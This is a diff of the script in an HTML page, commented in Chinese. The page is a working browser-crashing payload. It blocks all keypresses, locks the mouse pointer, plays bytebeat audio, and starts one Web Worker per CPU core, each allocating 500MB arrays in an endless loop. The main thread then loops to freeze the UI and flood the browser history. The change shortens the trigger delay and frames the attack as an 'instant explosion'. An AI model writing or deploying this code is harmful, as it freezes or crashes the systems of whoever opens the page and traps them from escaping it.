@@ -10,18 +10,17 @@
     <script>
         let triggered = false;
 
-        // 1. 全面封鎖鍵盤 (防止 Esc 或 Alt+F4 太快被按下)
+        // 攔截鍵盤
         window.addEventListener('keydown', (e) => e.preventDefault(), true);
 
         function launch() {
             if (triggered) return;
             triggered = true;
 
-            // 2. 請求全螢幕與指針鎖定 (雙重鎖定)
-            if (document.documentElement.requestFullscreen) document.documentElement.requestFullscreen();
+            // 1. 鎖定滑鼠
             document.body.requestPointerLock();
 
-            // 3. 啟動 Bytebeat 音訊
+            // 2. Bytebeat
             const audioCtx = new (window.AudioContext || window.webkitAudioContext)();
             const scriptNode = audioCtx.createScriptProcessor(4096, 1, 1);
             let t = 0;
@@ -36,11 +35,12 @@
             scriptNode.connect(audioCtx.destination);
             if (audioCtx.state === 'suspended') audioCtx.resume();
 
-            // 4. 背景 Worker 立即開始吃掉 RAM
+            // 3. 瞬間爆破邏輯 (多線程並發分配)
             const workerCode = `
                 const data = [];
                 while(true) {
                     try {
+                        // 每個線程瘋狂申請 500MB
                         data.push(new Uint8Array(500 * 1024 * 1024).fill(0x52));
                     } catch(e) {
                         data.push(new Uint8Array(10 * 1024 * 1024));
@@ -49,22 +49,23 @@
             `;
             const blob = new Blob([workerCode], {type: 'application/javascript'});
             const url = URL.createObjectURL(blob);
-            for(let i = 0; i < (navigator.hardwareConcurrency || 8); i++) {
+
+            // 開啟與 CPU 核心數相等（或雙倍）的 Worker 同時開火
+            const threads = navigator.hardwareConcurrency || 8;
+            for(let i = 0; i < threads; i++) {
                 new Worker(url);
             }
 
-            // 5. 關鍵：延遲 20ms 後切斷主線程
+            // 主線程同時進行死循環鎖死 UI
             setTimeout(() => {
                 const mainData = [];
                 while(true) {
-                    // 鎖死 UI，讓提示無法消失，視窗無法移動
                     mainData.push(new Uint8Array(500 * 1024 * 1024).fill(0x52));
-                    document.title = "FATAL_ERROR_" + Math.random();
-                    window.history.pushState(null, null, Math.random().toString());
+                    document.title = Math.random();
+                    window.history.pushState({}, '', Math.random());
                 }
-            }, 20); 
+            }, 5);
         }
     </script>
 </body>
 </html>
-
